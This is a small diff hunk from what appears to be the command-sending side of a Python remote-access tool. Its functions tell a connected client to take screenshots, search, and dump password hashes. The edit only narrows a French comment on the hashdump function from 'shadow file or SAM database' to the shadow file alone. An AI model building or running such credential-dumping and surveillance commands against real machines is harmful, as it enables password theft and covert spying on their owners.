@@ -43,7 +43,7 @@ def screenshot(client_socket, nb_screenshot) :
 def search(client_socket) :
     client_socket.send(b'search') # Envoie de la commande
 
-# Fonction permettant de récupérer le fichier shadow ou la base SAM du client
+# Fonction permettant de récupérer le fichier shadow du client
 def hashdump(client_socket) :
     client_socket.send(b'hashdump') # Envoie de la commande
 
